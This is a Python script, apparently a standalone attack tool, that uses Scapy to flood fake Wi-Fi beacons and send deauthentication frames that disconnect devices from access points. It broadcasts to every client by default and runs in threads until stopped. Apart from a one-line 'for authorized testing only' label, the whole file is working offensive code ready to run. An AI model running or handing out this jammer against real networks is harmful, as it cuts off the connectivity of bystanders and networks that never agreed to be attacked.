#!/usr/bin/env python3
import argparse
import threading
import random
import string
from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11Deauth, Dot11Beacon, Dot11Elt

class WiFiAttackTool:
    def __init__(self):
        self.stop_beacon = False
        self.stop_deauth = False
        self.interface = None

    def random_ssid(self, length=8):
        """Generate random SSID for beacon flood"""
        chars = string.ascii_letters + string.digits
        return ''.join(random.choice(chars) for _ in range(length))

    def beacon_flood(self, ssid_prefix="FakeAP_", count=0):
        """Flood fake WiFi beacons to create phantom networks"""
        print(f"[+] Beacon Flooding on {self.interface} (SSID Prefix: {ssid_prefix})")
        while not self.stop_beacon:
            ssid = ssid_prefix + self.random_ssid(6)
            dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=RandMAC(), addr3=RandMAC())
            beacon = Dot11Beacon(cap="ESS+privacy")
            essid = Dot11Elt(ID="SSID", info=ssid, len=len(ssid))
            frame = RadioTap()/dot11/beacon/essid
            sendp(frame, inter=0.1, count=count, iface=self.interface, verbose=0)
        print("[!] Beacon flood stopped")

    def deauth_attack(self, target_mac="ff:ff:ff:ff:ff:ff", ap_mac="ff:ff:ff:ff:ff:ff", count=0):
        """Send deauth packets to disrupt WiFi connections (WiFi jamming)"""
        print(f"[+] Deauth Attack on {self.interface} (Target: {target_mac}, AP: {ap_mac})")
        while not self.stop_deauth:
            dot11 = Dot11(addr1=target_mac, addr2=ap_mac, addr3=ap_mac)
            packet = RadioTap()/dot11/Dot11Deauth(reason=7)  # Reason 7 = Class 3 frame received from non-associated STA
            sendp(packet, inter=0.1, count=count, iface=self.interface, verbose=0)
        print("[!] Deauth attack stopped")

    def start_attacks(self, args):
        """Start selected attacks in threads"""
        self.interface = args.interface
        
        if args.beacon:
            beacon_thread = threading.Thread(target=self.beacon_flood, args=(args.ssid_prefix, args.count))
            beacon_thread.daemon = True
            beacon_thread.start()

        if args.deauth:
            deauth_thread = threading.Thread(target=self.deauth_attack, args=(args.target_mac, args.ap_mac, args.count))
            deauth_thread.daemon = True
            deauth_thread.start()

        try:
            while True:  # Keep running until Ctrl+C
                pass
        except KeyboardInterrupt:
            self.stop_beacon = True
            self.stop_deauth = True
            print("\n[!] Stopping all attacks...")

def main():
    parser = argparse.ArgumentParser(description="WiFi Jammer + Beacon Flood Tool (For authorized testing only)")
    parser.add_argument("-i", "--interface", required=True, help="Wireless interface (must be in monitor mode, e.g., wlan0mon)")
    
    # Beacon Flood Options
    parser.add_argument("-b", "--beacon", action="store_true", help="Enable beacon flood attack")
    parser.add_argument("-p", "--ssid-prefix", default="FakeAP_", help="Prefix for fake SSIDs")
    
    # Deauth Attack Options
    parser.add_argument("-d", "--deauth", action="store_true", help="Enable deauthentication attack (WiFi jamming)")
    parser.add_argument("-t", "--target-mac", default="ff:ff:ff:ff:ff:ff", help="Target device MAC (use 'ff:ff:ff:ff:ff:ff' for broadcast)")
    parser.add_argument("-a", "--ap-mac", default="ff:ff:ff:ff:ff:ff", help="Access Point MAC (default: broadcast)")
    
    parser.add_argument("-c", "--count", type=int, default=0, help="Number of packets to send (0 = unlimited)")

    args = parser.parse_args()

    if not (args.beacon or args.deauth):
        parser.error("Select at least one attack mode (--beacon or --deauth)")

    tool = WiFiAttackTool()
    tool.start_attacks(args)

if __name__ == "__main__":
    main()
